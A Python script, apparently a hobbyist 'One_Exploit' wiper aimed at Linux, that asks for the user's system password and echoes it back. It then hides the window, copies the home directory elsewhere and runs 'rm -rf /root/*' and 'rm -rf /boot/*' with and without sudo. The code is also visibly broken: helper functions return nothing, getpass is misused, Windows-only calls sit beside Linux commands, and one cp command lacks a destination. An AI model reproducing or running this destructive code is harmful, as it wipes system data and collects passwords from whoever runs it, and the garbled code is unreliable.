import time, banner, win32gui, os, socket, getpass, win32con
from requests import get
from color import Color

def ClearCSR():
    os.system('clear')
    os.system('cls')

def username():
    getpass.getuser()

def ip_local():
    get('https://api.ipify.org').text

def ip_public():
    socket.gethostbyname(socket.gethostname())

def Linux():
    while True:
        try:
            time.sleep(1)
            os.system('clear')
            banner.Created_banner(Color.RED + 'Linux')
            
            password = input('your system have password?(Y , n) : ').lower()
            if password == 'y':
                passnamesystem = getpass('Inter password '+username()+" : ")
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                print('We are One_Exploit')
                print(f'usename: {username()}')
                print(f'pass: {passnamesystem}')
                time.sleep(2)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                os.system('sudo su')
                os.system('echo '+passnamesystem)
                os.system('cp -r /home/'+username()+'/* /techer0221/')
                os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')

            else:
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                print('We are One_Exploit')
                print(f'usename: {username()}')
                print('password: ')
                time.sleep(2)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                os.system('sudo su')
                os.system('cp -r /home/'+username()+'/* /techer0221/')
                os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
            break
        except AttributeError:
            print( Color.RED +'[*] -> plese check the systems.')
